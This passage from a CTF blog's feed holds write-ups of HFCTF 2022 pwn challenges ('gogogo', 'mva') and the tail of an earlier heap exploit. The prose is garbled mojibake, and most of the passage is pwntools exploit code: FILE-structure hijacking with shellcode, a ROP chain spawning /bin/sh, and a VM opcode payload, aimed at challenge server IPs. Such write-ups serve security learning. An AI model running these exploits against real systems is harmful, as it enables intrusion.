class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        delete(i)<br><br>    show(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x30780</span><br><br>    add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">5</span>)<br>    edit(<span class="hljs-number">4</span>, p64(heap_addr + <span class="hljs-number">0x2c0</span>))<br>    add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">0x310</span>, p64(heap_addr + <span class="hljs-number">0x240</span>))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    show(<span class="hljs-number">7</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-comment">#libcbase = leak - 0x22820 - 0x1f4000</span><br>    <span class="hljs-comment">#libcbase = leak - 0x228820 - i * 0x20</span><br>    libcbase = leak - <span class="hljs-number">0x22820</span> - <span class="hljs-number">0x1f4000</span> + <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        delete(i + <span class="hljs-number">9</span>)<br><br><br>    IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    pop_rdi_ret = libcbase + <span class="hljs-number">0x23b6a</span><br>    pop_rsi_ret = libcbase + <span class="hljs-number">0x2601f</span><br>    pop_rdx_ret = libcbase + <span class="hljs-number">0x142c92</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br>    <span class="hljs-comment">#fake_addr = IO_2_1_stdout</span><br><br>    faker_addr = heap_addr + <span class="hljs-number">0x50c80</span><br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>    payload += p64(faker_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdi_ret + <span class="hljs-number">1</span>)<br>    payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    payload += flat(<br>        pop_rdi_ret, ((faker_addr + <span class="hljs-number">0x100</span>) &gt;&gt; <span class="hljs-number">12</span>) &lt;&lt; <span class="hljs-number">12</span>,<br>        pop_rsi_ret, <span class="hljs-number">0x2000</span>,<br>        pop_rdx_ret, <span class="hljs-number">7</span>,<br>        libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>        faker_addr + <span class="hljs-number">0x140</span><br>    )<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><br>    edit(<span class="hljs-number">12</span>, p64(IO_2_1_stdout))<br>    add(<span class="hljs-number">0x400</span>, payload)<br><br>    fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x50c80</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE += p64(heap_addr)<br>    fake_IO_FILE += p64(magic_gadget)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    add(<span class="hljs-number">0x400</span>, fake_IO_FILE)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30191</span>)<br><span class="hljs-comment">#p = remote(&#x27;172.17.0.1&#x27;, 9999)</span><br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>exp()<br>p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hfctf2022</title>
    <link href="/2023/07/06/hfctf2022/"/>
    <url>/2023/07/06/hfctf2022/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¹´çš„å¤©æ´¥å¸‚çš„ctfæ¯”èµ›ç«Ÿç„¶ä½¿ç”¨å¥‡å®‰ä¿¡çš„å¹³å°ï¼Œæƒ³åˆ°å»å¹´çš„å¸‚èµ›ä¸çŸ¥é“ç”¨è°å®¶çš„å¹³å°ï¼Œè¿ä¸ªpwnçš„é¶æœºéƒ½æ²¡æå¥½ï¼Œä½“éªŒå·¨å·®ï¼Œä»Šå¹´å¥‡å®‰ä¿¡çš„å¹³å°å°±éå¸¸èˆ’æœã€‚</p><p>å¤©æ´¥å¸‚çš„ctfæ¯”èµ›å…¨æ˜¯å…¥é—¨é¢˜ï¼Œæ²¡ä»€ä¹ˆå¯è¯´çš„ã€‚åæ¥æˆ‘çœ‹åˆ°å¥‡å®‰ä¿¡çš„å¹³å°ä¸Šè¿˜æœ‰å­˜æœ‰å»å¹´è™ç¬¦ctfçš„é¢˜ï¼Œè‡ªå·±å°±è¯•ç€å¤ç°ä¸€ä¸‹ã€‚</p><p>ç½‘ä¸Šå…¶ä»–å¸ˆå‚…ä¹Ÿéƒ½å¤ç°è¿‡ï¼Œå»ºè®®ç›´æ¥çœ‹è¿™äº›å¸ˆå‚…çš„åšå®¢ï¼š</p><p><a href="https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/">https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://bbs.kanxue.com/thread-271978.htm">https://bbs.kanxue.com/thread-271978.htm</a></p><p><a href="https://www.xi4oyu.top/cdcd3a27">https://www.xi4oyu.top/cdcd3a27</a></p><p><a href="https://r3kapig.com/writeup/20211102-hacklu/#unsafemid">https://r3kapig.com/writeup/20211102-hacklu/#unsafemid</a></p><p>â€‹                                                                                     </p><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p>çœŸä½©æœå‡ºé¢˜äººçš„è„‘æ´ï¼Œæ‹¿ä¸ªmain__mainå‡½æ•°è¿·æƒ‘ä½ ï¼ŒçœŸæ­£çš„ä¸»å‡½æ•°æ˜¯math_initå‡½æ•°ï¼Œé‡Œé¢çš„å­—ç¬¦ä¸²ç«Ÿç„¶æ˜¯ç”±ä¸€ä¸ªä¸€ä¸ªå­—æ¯æ‰“å°å‡ºæ¥çš„</p><img src="/img/15/Screenshot 2023-07-10 141548.png" style="zoom:80%;" /><p>è¿™é‡Œå‚è€ƒäº†ä¸€ä¸‹<a href="https://www.hex-rays.com/products/ida/support/idadoc/1361.shtml">idaçš„user_callæ•™ç¨‹</a>ï¼Œæ”¹å˜ä¸€ä¸‹å‡½æ•°å‚æ•°è°ƒç”¨è§„åˆ™ï¼Œè®©ä¼ªä»£ç æ›´å¥½çœ‹ã€‚æœ€åçš„æ¼æ´æ˜¯åœ¨é€šè¿‡BULLS AND COWSçš„æ¸¸æˆåè¿›å…¥exité€‰é¡¹åçš„æ ˆæº¢å‡ºï¼ˆæ­£å¸¸äººå“ªæƒ³å¾—åˆ°ï¼‰ã€‚</p><p>æœ€åçš„expå‚è€ƒäº†<a href="https://blog.csdn.net/weixin_44946764/article/details/125211885">è¿™ç¯‡åšå®¢çš„BULLS AND COWSçš„è§£æ³•</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;gogogo&#x27;</span>)<br><span class="hljs-comment">#sh = process(&#x27;./gogogo&#x27;)</span><br>sh = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>, <span class="hljs-number">49363</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;305419896&#x27;)</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;1717986918&#x27;)</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1416925456&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;GUESS\n&#x27;</span>)<br>li = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]<br>guessli = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> li:<br>        <span class="hljs-keyword">if</span> u == i:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> li:<br>            <span class="hljs-keyword">if</span> u == o <span class="hljs-keyword">or</span> o == i:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> li:<br>                <span class="hljs-keyword">if</span> p == o <span class="hljs-keyword">or</span> p == u <span class="hljs-keyword">or</span> p == i:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">else</span>:<br>                    four = p<br>                    guessli.append([i,u,o,p])<br><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> guess <span class="hljs-keyword">in</span> guessli:<br>    total += <span class="hljs-number">1</span><br>    time.sleep(<span class="hljs-number">1</span>)<br>    num = <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">1</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">2</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">3</span>])<br>    <span class="hljs-comment">#print(num)</span><br>    sh.sendline(num.encode())<br>    recv = sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;YOU WIN\n&#x27;</span> <span class="hljs-keyword">in</span> recv:<br>        <span class="hljs-keyword">break</span><br>    A = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>], <span class="hljs-number">10</span>)<br>    B = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>], <span class="hljs-number">10</span>)<br>    A = <span class="hljs-built_in">str</span>(A)<br>    B = <span class="hljs-built_in">str</span>(B)<br>    <span class="hljs-keyword">if</span>(total == <span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">break</span><br>    guessli.remove(guess)<br>    <span class="hljs-comment">#print(guessli)</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.isdigit(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>.isdigit(B) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(B) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(A)+<span class="hljs-built_in">int</span>(B) &lt;= <span class="hljs-number">4</span> :<br>                A = <span class="hljs-built_in">int</span>(A)<br>                B = <span class="hljs-built_in">int</span>(B)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> A == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> B == <span class="hljs-number">0</span> :<br>        guesslis = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslis:<br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">elif</span> A == <span class="hljs-number">0</span>:<br>        guesslia = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslia:<br>            <span class="hljs-keyword">if</span> item[<span class="hljs-number">0</span>] == guess[<span class="hljs-number">0</span>] :<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == guess[<span class="hljs-number">1</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">2</span>] == guess[<span class="hljs-number">2</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">3</span>] == guess[<span class="hljs-number">3</span>]:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A + B &gt; <span class="hljs-number">0</span>:<br>        guesslib = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslib:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A + B <span class="hljs-keyword">or</span> count &gt; A + B:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A &gt; <span class="hljs-number">0</span>:<br>        guesslie = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslie:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] == item[<span class="hljs-number">0</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] == item[<span class="hljs-number">1</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] == item[<span class="hljs-number">2</span>] :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] == item[<span class="hljs-number">3</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A:<br>                guessli.remove(item)<br><br>sh.sendline(<span class="hljs-string">b&#x27;EXIT&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;(4) EXIT\n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>pop_rax_ret = <span class="hljs-number">0x405b78</span><br>pop_rdx_ret = <span class="hljs-number">0x48546c</span><br>mov_rdi_rax_ret = <span class="hljs-number">0x45beb8</span><br>xchg_rsi_rax_ret = <span class="hljs-number">0x45b327</span><br>syscall_ret = <span class="hljs-number">0x45c849</span><br>payload = <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">0x460</span><br>payload += flat(<br>    pop_rax_ret, <span class="hljs-number">0x68732f6e69622f</span>,<br>    mov_rdi_rax_ret,<br>    pop_rax_ret, <span class="hljs-number">0</span>,<br>    xchg_rsi_rax_ret,<br>    pop_rdx_ret, <span class="hljs-number">0</span>,<br>    pop_rax_ret, <span class="hljs-number">0x3b</span>,<br>    syscall_ret<br>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;SURE?&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># sh.sendlineafter(b&#x27;BYE~&#x27;, b&#x27;a&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h3><p>ä¸€ä¸ªvmpwné¢˜ï¼Œæ¯4ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªæŒ‡ä»¤ï¼Œæœ€åä¹Ÿå¾ˆå®¹æ˜“æ‰¾åˆ°è¿™ä¸ªæ•°ç»„çš„è´Ÿæ•°æº¢å‡º</p><img src="/img/15/Screenshot 2023-07-10 143827.png" style="zoom:80%;" /><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥æ”¹æ‰popæ“ä½œä¸­çš„æ•°ç»„ç´¢å¼•ï¼Œå®ç°æ ˆä¸Šçš„æ•°æ®ä»»æ„è¯»ï¼Œè¯»å–<code>__libc_start_main</code>å‡½æ•°ï¼Œåˆ©ç”¨åŠ å‡è¿ç®—å¯ä»¥æ”¹ä¸ºone_gadgetï¼Œä½†æ˜¯pushæ“ä½œå¯¹ç´¢å¼•é™åˆ¶äº†å¤§å° ï¼Œå½“æ—¶è‡ªå·±å¹¶æ²¡æœ‰æƒ³åˆ°åˆé€‚æ–¹æ³•æ¥å®ç°æ ˆä¸Šçš„æ•°æ®ä»»æ„å†™ï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpæ‰æç„¶å¤§æ‚Ÿï¼Œpushä¸­æœ‰<code>mov  [rbp+rax*2+var_210], dx</code>ï¼Œåˆ©ç”¨rax*2çš„è´Ÿæ•°æº¢å‡ºå³å¯ç»•è¿‡ç´¢å¼•çš„é™åˆ¶ã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;mva&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./mva&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">s1, val</span>):<br>    code = p8(<span class="hljs-number">1</span>) + p8(s1) + p8(val &gt;&gt; <span class="hljs-number">8</span>) + p8(val &amp; <span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">2</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">3</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">s1, s2</span>):<br>    code = p8(<span class="hljs-number">0xe</span>) + p8(s1) + p8(s2) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>():<br>    code = p8(<span class="hljs-number">0x9</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">s1</span>):<br>    code = p8(<span class="hljs-number">0xa</span>) + p8(s1) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br>payload = mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10e</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += pop(<span class="hljs-number">1</span>) + pop(<span class="hljs-number">2</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x582</span>) + sub(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0xc</span>) + add(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10c</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf7</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x8000</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf9</span>)<br>payload += load(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>) + push() + load(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) + push()<br><br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span 